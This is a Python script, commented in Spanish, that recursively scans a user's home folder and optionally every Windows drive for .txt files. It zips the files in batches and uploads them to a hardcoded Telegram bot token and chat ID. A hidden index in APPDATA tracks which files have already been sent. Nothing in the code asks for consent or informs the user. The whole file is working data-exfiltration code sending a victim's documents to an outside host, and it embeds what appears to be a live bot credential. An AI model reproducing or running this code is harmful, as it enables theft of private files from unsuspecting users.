import os
import sys
import json
import hashlib
import zipfile
from pathlib import Path
from typing import Iterable, List, Tuple
import requests
import time

# ===========================
#  CREDENCIALES DEL BOT
# ===========================
BOT_TOKEN = "6137879346:AAFbSSJmWCDFjgMqm7xxr7jjJmRh7z137GI"
CHAT_ID = "6623014135"

# ===========================
#  OPCIONES
# ===========================
# Límite duro de Telegram para bots ~50 MB por documento
TELEGRAM_LIMIT_BYTES = 50 * 1024 * 1024
# Colchón seguro al agrupar (suma de tamaños sin comprimir por lote)
BATCH_RAW_SOFT_LIMIT = 40 * 1024 * 1024

# Tamaño máximo de .txt individual a considerar (si excede, se omite)
MAX_SINGLE_TXT_BYTES = 45 * 1024 * 1024

# Extensiones a incluir
INCLUDE_EXTS = {".txt"}

# Hash de contenido para deduplicar con precisión (más lento pero robusto)
USE_CONTENT_HASH = True

# Buscar TODO el perfil de usuario (home). Si quieres probar solo Desktop/Docs, cámbialo.
SEARCH_WHOLE_DRIVES = False  # si True y estás en Windows, recorre C:\, D:\ ... (lento)

# ===========================
#  RUTAS Y UTILIDADES
# ===========================
def get_appdata_dir() -> Path:
    appdata = os.getenv("APPDATA")
    if appdata:
        base = Path(appdata) / "TelegramTxtSender"
    else:
        base = Path.home() / ".telegram_txt_sender"
    base.mkdir(parents=True, exist_ok=True)
    return base

APP_DIR = get_appdata_dir()
INDEX_PATH = APP_DIR / "sent_index.jsonl"   # registro de hashes enviados
LOG_PATH = APP_DIR / "last_run.log"
ARCHIVES_DIR = APP_DIR / "archives"
ARCHIVES_DIR.mkdir(parents=True, exist_ok=True)

def log(msg: str):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    try:
        with LOG_PATH.open("a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass
    print(line)

def iter_user_profile_dirs():
    home = Path.home()

    excludes = set()
    excludes.add(str(APP_DIR.resolve()).lower())

    appdata_env = os.getenv("APPDATA")
    if appdata_env:
        excludes.add(str(Path(appdata_env).resolve()).lower())
        local_appdata = os.getenv("LOCALAPPDATA")
        if local_appdata:
            excludes.add(str(Path(local_appdata).resolve()).lower())

    common_excludes = [
        ".cache", ".config", ".local", ".venv", "node_modules",
        "venv", "env", "__pycache__", ".git"
    ]

    def is_excluded(p: Path) -> bool:
        try:
            p_str = str(p.resolve()).lower()
        except Exception:
            p_str = str(p).lower()
        if any(p_str.startswith(ex) for ex in excludes):
            return True
        parts = [part.lower() for part in p.parts]
        return any(name in parts for name in common_excludes)

    for root, dirs, files in os.walk(home, topdown=True):
        root_path = Path(root)
        dirs[:] = [d for d in dirs if not is_excluded(root_path / d)]
        yield root_path, files

def iter_all_drives():
    import string
    drives = []
    if os.name == "nt":
        for letter in string.ascii_uppercase:
            d = Path(f"{letter}:/")
            if d.exists():
                drives.append(d)

    excludes_roots = {"windows", "program files", "program files (x86)", "programdata", "$recycle.bin", "system volume information"}

    for drive in drives:
        for root, dirs, files in os.walk(drive, topdown=True):
            root_path = Path(root)
            dirs[:] = [d for d in dirs if d.lower() not in excludes_roots]
            yield root_path, files

def file_fingerprint(path: Path) -> str:
    if USE_CONTENT_HASH:
        try:
            h = hashlib.sha256()
            with path.open("rb") as f:
                for chunk in iter(lambda: f.read(1024 * 1024), b""):
                    h.update(chunk)
            return "sha256:" + h.hexdigest()
        except Exception:
            pass
    try:
        stat = path.stat()
        raw = f"{str(path.resolve())}|{stat.st_size}|{int(stat.st_mtime)}".encode("utf-8", errors="ignore")
        return "fast:" + hashlib.sha1(raw).hexdigest()
    except Exception:
        return "path:" + hashlib.md5(str(path.resolve()).encode("utf-8", errors="ignore")).hexdigest()

def load_sent_index() -> set:
    seen = set()
    if INDEX_PATH.exists():
        with INDEX_PATH.open("r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    obj = json.loads(line)
                    h = obj.get("hash")
                    if h:
                        seen.add(h)
                except Exception:
                    continue
    return seen

def append_to_index(file_hash: str, path: Path):
    try:
        with INDEX_PATH.open("a", encoding="utf-8") as f:
            f.write(json.dumps({"hash": file_hash, "path": str(path)}) + "\n")
    except Exception:
        pass

def should_skip(path: Path) -> bool:
    try:
        if not path.is_file():
            return True
        if path.suffix.lower() not in INCLUDE_EXTS:
            return True
        size = path.stat().st_size
        if size <= 0 or size > MAX_SINGLE_TXT_BYTES:
            return True
        if APP_DIR in path.parents:
            return True
    except Exception:
        return True
    return False

def scan_sources() -> Iterable[Path]:
    # 1) Home
    for root_path, files in iter_user_profile_dirs():
        for name in files:
            p = root_path / name
            if not should_skip(p):
                yield p
    # 2) (opcional) todas las unidades (Windows)
    if SEARCH_WHOLE_DRIVES and os.name == "nt":
        for root_path, files in iter_all_drives():
            for name in files:
                p = root_path / name
                if not should_skip(p):
                    yield p

def batch_by_size(paths_and_sizes: List[Tuple[Path, int]], soft_limit: int) -> List[List[Tuple[Path, int]]]:
    """Greedy sencillo: llena lotes hasta superar soft_limit (tamaño SIN comprimir)."""
    batches = []
    current = []
    cur_sum = 0
    for p, sz in paths_and_sizes:
        if sz > soft_limit and not current:
            # archivo grande pero permitido (< MAX_SINGLE_TXT_BYTES); va solo en su lote
            batches.append([(p, sz)])
            continue
        if cur_sum + sz > soft_limit and current:
            batches.append(current)
            current = [(p, sz)]
            cur_sum = sz
        else:
            current.append((p, sz))
            cur_sum += sz
    if current:
        batches.append(current)
    return batches

def build_zip(batch: List[Tuple[Path, int]], out_dir: Path, idx: int) -> Path:
    zip_path = out_dir / f"text_batch_{idx:03d}.zip"
    manifest_lines = []
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for p, _sz in batch:
            arcname = p.name  # solo nombre de archivo; si prefieres ruta relativa, cámbialo
            zf.write(p, arcname=arcname)
            manifest_lines.append(str(p))
        # Agrega un manifiesto con rutas completas por si luego quieres rastrear origen
        zf.writestr("MANIFEST.txt", "\n".join(manifest_lines))
    return zip_path

def enviar_documento(bot_token: str, chat_id: str, ruta: Path, caption: str = "") -> dict:
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with ruta.open("rb") as f:
        files = {"document": (ruta.name, f)}
        data = {"chat_id": chat_id, "caption": caption or ruta.name}
        r = requests.post(url, data=data, files=files, timeout=120)

    if not r.ok:
        try:
            log(f"Detalle Telegram: {r.json()}")
        except Exception:
            log(f"Detalle Telegram (raw): {r.text}")
        r.raise_for_status()
    return r.json()

def main():
    if not BOT_TOKEN or not CHAT_ID:
        log("Faltan BOT_TOKEN o CHAT_ID.")
        sys.exit(1)

    seen = load_sent_index()

    # 1) Recolecta candidatos NUEVOS
    candidates: List[Tuple[Path, str, int]] = []
    for p in scan_sources():
        try:
            h = file_fingerprint(p)
            if h in seen:
                continue
            sz = p.stat().st_size
            candidates.append((p, h, sz))
        except Exception:
            continue

    if not candidates:
        log("No hay archivos .txt nuevos para enviar.")
        return

    # 2) Prepara lotes por tamaño sin comprimir
    candidates.sort(key=lambda x: x[2])  # por tamaño ascendente (mejor llenado)
    paths_and_sizes = [(p, sz) for p, _h, sz in candidates]
    batches = batch_by_size(paths_and_sizes, BATCH_RAW_SOFT_LIMIT)

    log(f"Se crearán {len(batches)} zip(s) de hasta ~{BATCH_RAW_SOFT_LIMIT // (1024*1024)} MB (raw).")

    # 3) Construye zips
    zips: List[Tuple[Path, List[Tuple[Path, str]]]] = []  # (zip_path, [(path, hash), ...])
    idx = 1
    for batch in batches:
        zip_path = build_zip(batch, ARCHIVES_DIR, idx)
        zips.append((zip_path, [(p, next(h for (pp, h, _sz) in candidates if pp == p)) for p, _sz in batch]))
        idx += 1

    # 4) Envía cada zip y, si ok, marca sus archivos como enviados
    sent_files = 0
    for i, (zip_path, batch_items) in enumerate(zips, start=1):
        try:
            # Chequeo rápido de tamaño final por si acaso
            if zip_path.stat().st_size > TELEGRAM_LIMIT_BYTES:
                log(f"⚠️ Zip {zip_path.name} pesa {zip_path.stat().st_size} bytes (>50MB). Partir lote o bajar límite.")
                continue
            caption = f"TXT batch {i}/{len(zips)} ({zip_path.name})"
            enviar_documento(BOT_TOKEN, CHAT_ID, zip_path, caption=caption)
            log(f"✅ Enviado zip: {zip_path.name}")
            # Marca como enviados los archivos del lote
            for p, h in batch_items:
                append_to_index(h, p)
                sent_files += 1
        except Exception as e:
            log(f"❌ Error enviando zip {zip_path.name}: {e}")

    log(f"Resumen: {sent_files} archivo(s) contenidos enviados dentro de {len(zips)} zip(s).")

if __name__ == "__main__":
    main()
